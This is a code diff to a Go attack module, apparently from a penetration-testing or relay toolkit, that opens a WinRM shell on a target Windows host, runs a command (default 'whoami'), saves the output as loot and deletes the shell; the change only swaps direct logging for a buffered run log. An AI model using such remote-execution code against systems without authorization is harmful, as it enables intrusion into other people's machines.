@@ -37,6 +37,8 @@ func (a *WinRMExecAttack) Run(session interface{}, config *Config) error {
 		return fmt.Errorf("winrmexec attack requires WinRM session (got %T)", session)
 	}
 
+	rl := &runLog{}
+
 	command := config.Command
 	if command == "" {
 		command = "whoami"
@@ -45,7 +47,7 @@ func (a *WinRMExecAttack) Run(session interface{}, config *Config) error {
 	toAddr := client.baseURL() + "/wsman"
 
 	// Step 1: Create shell
-	log.Printf("[*] Creating WinRM shell on %s...", client.targetAddr)
+	rl.Printf("[*] Creating WinRM shell on %s...", client.targetAddr)
 	shellResp, err := client.DoWinRMRequest(shellCreateXML(toAddr))
 	if err != nil {
 		return fmt.Errorf("create shell: %v", err)
@@ -54,15 +56,15 @@ func (a *WinRMExecAttack) Run(session interface{}, config *Config) error {
 	shellID := extractShellID(shellResp)
 	if shellID == "" {
 		if build.Debug {
-			log.Printf("[D] WinRM shell create response: %s", shellResp)
+			rl.Printf("[D] WinRM shell create response: %s", shellResp)
 		}
 		return fmt.Errorf("failed to extract ShellId from response")
 	}
-	log.Printf("[*] Shell created: %s", shellID)
+	rl.Printf("[*] Shell created: %s", shellID)
 
 	// Step 2: Execute command
 	if build.Debug {
-		log.Printf("[D] WinRM: executing command: %s", command)
+		rl.Printf("[D] WinRM: executing command: %s", command)
 	}
 	cmdResp, err := client.DoWinRMRequest(executeCommandXML(toAddr, shellID, command))
 	if err != nil {
@@ -88,13 +90,12 @@ func (a *WinRMExecAttack) Run(session interface{}, config *Config) error {
 
 	output := decodeOutputStream(outResp)
 
-	openCommandLoot(config, hostFromAddr(client.targetAddr), "winrmexec", command)
 	if output != "" {
-		commandLootf("[+] Command output:\n%s", output)
+		rl.Printf("[+] Command output:\n%s", strings.TrimSpace(output))
 	} else {
-		commandLootf("[*] Command executed (no output)")
+		rl.Printf("[*] Command executed (no output)")
 	}
-	closeCommandLoot()
+	rl.Flush(config, hostFromAddr(client.targetAddr), "winrmexec", command)
 
 	// Step 4: Delete shell
 	deleteShell(client, toAddr, shellID)
